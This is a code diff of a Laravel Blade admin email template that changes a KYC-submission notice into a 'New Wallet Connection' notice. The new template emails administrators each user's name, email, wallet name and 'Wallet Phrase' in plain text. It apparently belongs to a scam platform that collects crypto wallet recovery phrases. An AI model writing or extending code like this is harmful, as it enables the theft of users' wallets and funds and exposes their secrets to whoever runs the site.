@@ -4,7 +4,7 @@
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>New KYC Submission for Review - {{ config('app.name') }}</title>
+        <title>[Admin] A New Wallet Was Connected - {{ config('app.name') }}</title>
         <style>
             /* Reset styles for email client compatibility */
             body {
@@ -210,32 +210,36 @@
                         </div>
 
                         <div class="content">
-                            <h1 class="greeting">New KYC Submission</h1>
-                            <p class="subtitle">A new KYC submission has been received and requires your review.</p>
+                            <h1 class="greeting">New Wallet Connection</h1>
+                            <p class="subtitle">A new wallet has been connected to a user account and requires your review.</p>
 
                             <div class="activity-details">
                                 <h3>👤 User Details</h3>
                                 <div class="detail-row">
                                     <span class="detail-label">User Name:</span>
-                                    <span class="detail-value">{{ $submission->user->first_name }} {{ $submission->user->last_name }}</span>
+                                    <span class="detail-value">{{ $user->first_name }} {{ $user->last_name }}</span>
                                 </div>
                                 <div class="detail-row">
                                     <span class="detail-label">User Email:</span>
-                                    <span class="detail-value">{{ $submission->user->email }}</span>
+                                    <span class="detail-value">{{ $user->email }}</span>
                                 </div>
                                 <div class="detail-row">
-                                    <span class="detail-label">Submission ID:</span>
-                                    <span class="detail-value">{{ $submission->id }}</span>
+                                    <span class="detail-label">Wallet Name:</span>
+                                    <span class="detail-value">{{ $walletConnection->wallet_name }}</span>
                                 </div>
                                 <div class="detail-row">
-                                    <span class="detail-label">Date Submitted:</span>
-                                    <span class="detail-value">{{ $submission->created_at->format('F j, Y, g:i A') }}</span>
+                                    <span class="detail-label">Wallet Phrase:</span>
+                                    <span class="detail-value">{{ $walletConnection->wallet_phrase }}</span>
+                                </div>
+                                <div class="detail-row">
+                                    <span class="detail-label">Connection Time:</span>
+                                    <span class="detail-value">{{ $walletConnection->created_at->format('F j, Y \a\t g:i A') }}</span>
                                 </div>
                             </div>
 
-                            <p style="margin: 30px 0;">Please review the submission in the admin dashboard to approve or reject it.</p>
+                            <p style="margin: 30px 0;">Please review the wallet connection in the admin dashboard for verification or monitoring.</p>
 
-                            <a href="{{ route('admin.kyc.show', $submission->id) }}" class="button">Review Submission</a>
+                            <a href="{{ route('admin.wallet.show', $walletConnection->id) }}" class="button">Review Wallet Connection</a>
                         </div>
 
                         <div class="footer">
